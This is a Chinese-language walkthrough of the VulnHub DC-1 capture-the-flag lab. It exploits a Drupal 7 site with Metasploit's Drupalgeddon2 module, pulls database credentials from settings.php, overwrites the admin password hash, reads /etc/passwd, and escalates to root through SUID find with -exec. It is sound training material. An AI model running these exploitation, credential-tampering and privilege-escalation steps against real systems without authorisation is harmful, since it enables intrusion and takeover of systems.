# DC-1

## 一、描述

```text
VM名称：DC-1
下载（镜像）： https://download.vulnhub.com/dc/DC-1.zip
描述：DC-1是一个专门构建的易受攻击的实验环境，目的是获得渗透测试的经验。
它的设计对初学者来说是一个挑战，但是它的难易程度取决于您的技能和知识以及学习能力。要成功完成此挑战，您需要具备Linux技能，熟悉Linux命令行以及具有使用基本渗透测试工具（例如可在Kali Linux或Parrot Security OS上找到的工具）的经验。
有多种获得root的方法，但是，其中包含了一些flag，这些flag包含了一些线索。
总共有五个flag，但是最终目标是在root的主目录中找到并读取该flag。您甚至不需要成为root用户即可执行此操作，但是，您将需要root特权。
根据您的技能水平，您可能可以跳过查找这些标志中的大多数标志并直接寻找根。
初学者可能会遇到他们以前从未遇到过的挑战，但是Google搜索应该是获得完成此挑战所需信息所需要的全部。
```

## 二、开始训练

使用arp-scan扫描子网

```text
arp-scan 192.168.1.0/24
```

![image-20210311093457854](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311093457854.png)

发现疑似靶机IP

尝试打开

![image-20210310145049301](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210310145049301.png)

使用nmap详细扫描该IP

```text
nmap -A 192.168.1.233
```

![image-20210310145445014](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210310145445014.png)

没有发现什么有价值的东西

回顾网站，发现是一个Drupal的CMS，使用whatweb查看网站的详细信息

![image-20210311101055138](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311101055138.png)

确定是一个Drupal的CMS且版本为7

上网搜索这个CMS的漏洞利用方式

![image-20210311102312915](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311102312915.png)

可以使用Metasploit来进行查找这个cms在msf中能进行利用的exp

启动Metasploit

```text
msfconsole
```

查找drupal的exp

```text
search drupal
```

![image-20210311103202473](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311103202473.png)

使用这个exp

```text
use exploit/unix/webapp/drupal_drupalgeddon2
```

![image-20210311104314214](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311104314214.png)

查看配置

```text
show options
```

![image-20210311104400421](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311104400421.png)

进行反弹shell

```text
set RHOSTS 192.168.1.233
exploit 看到提示Meterpreter session 1opened并出现 meterpreter> 说明攻击成功。
shell 执行命令shell命令获得shell
whoami 查看当前用户
ls 查看当前目录下文件
```

![image-20210311104932032](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311104932032.png)

目录显示如下

![image-20210311105011049](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311105011049.png)

发现flag1.txt

使用cat命令查看

```text
cat flag1.txt
```

![image-20210311105057861](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311105057861.png)

```text
Every good CMS needs a config file - and so do you.
```

使用python反弹交互式shell

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20210311105247604](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311105247604.png)

drupal的配置文件是 /sites/default/settings.php ，是数据库连接配置文件。

![image-20210311105925462](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311105925462.png)

```text
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

我们在这里得到了第二个flag，以及数据库的用户名和密码

登陆mysql数据库

```text
mysql -u dbuser -p
```

用户名及密码

```text
username => dbuser
password => R0ck3t
```

![image-20210311110423821](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311110423821.png)

查看数据库

```text
show databases;
```

![image-20210311110659262](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311110659262.png)

使用数据库

```text
use drupaldb
```

![image-20210311110714578](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311110714578.png)

查看表

```text
show tablesl;
```

![image-20210311110728932](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311110728932.png)

发现users表

![image-20210311110826397](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311110826397.png)

查看表数据

```text
select * from users;
```

![image-20210311111230787](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311111230787.png)

比较乱，我们只选择name和pass两项数据

```text
select name,pass from users;
```

![image-20210311111326675](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311111326675.png)

得到用户名以及加密的密码

在网上找到密码的加密方法

![image-20210311122948727](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311122948727.png)

使用该加密文件加密

```text
php password-hash.sh 123456
password: 123456                hash: $S$DqV8AOAj7YCPuoV.pn10KQ7PUzlgUULmVFgVlc9N7fCJVdFYByzt
```

![image-20210311123012850](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311123012850.png)

使用生成的新密码替换旧密码

```text
update users set pass="$S$DqV8AOAj7YCPuoV.pn10KQ7PUzlgUULmVFgVlc9N7fCJVdFYByzt" where name="admin";
```

![image-20210311124505680](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311124505680.png)

之后回到网页，尝试登陆

![image-20210311124657091](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311124657091.png)

登陆成功成功进入后台

于后台管理的Content界面找到了flag3

![image-20210311125145401](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311125145401.png)

![image-20210311125206366](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311125206366.png)

```text
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
```

提示我们需要提升权限，需要在shadow文件中使用“-exec”

我们先去查看用户列表

```text
cat /etc/passwd
```

![image-20210311125559389](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311125559389.png)

发现flag4用户

> /etc/passwd包含系统所有账户信息，只有超级用户才有写和访问。该文件每个用户占一行用，分隔成七个字段。如下图所示：

![img](https://harvey-blog.com/wp-content/uploads/2020/11/截屏2020-11-09-下午11.20.23-1024x178.png)

转到falg4的home目录，发现有一个flag4.txt文件。但是提示需要root权限

```text
cd /home/flag4
ls
cat flag4.txt
```

![image-20210311125946608](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311125946608.png)

接下来尝试提权

先使用find获取root权限相关的信息

> find命令是用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件，并将查找到的子目录和文件全部进行显示。 find\(选项\)\(参数\) -exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令 -perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录

![image-20210311130119375](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311130119375.png)

发现了finalflag，但是也需要权限

联想到flag3中提示，需要使用"-exec"提权

开始提权

```text
cd /var/www
mkdir test
find test -exec '/bin/sh' \;
```

![image-20210311130903164](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311130903164.png)

提权成功

找到并打开flag4.txt

![image-20210311131031513](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311131031513.png)

```text
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```

提示最后一个flag在root文件夹中

进入root文件夹

```text
cd /
cd root
ls
cat thefinalflag.txt
```

![image-20210311131154740](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210311131154740.png)

```text
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

成功找到最后一个flag

靶机训练结束

